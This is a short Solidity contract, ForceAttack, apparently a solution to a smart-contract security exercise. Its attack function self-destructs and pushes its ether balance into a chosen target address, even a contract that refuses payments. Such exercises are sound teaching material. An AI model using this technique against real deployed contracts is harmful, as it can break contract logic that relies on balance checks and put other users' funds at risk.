//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

contract ForceAttack {
    function attack(address forceAddress_) public payable {
        selfdestruct(payable(forceAddress_));
    }
}
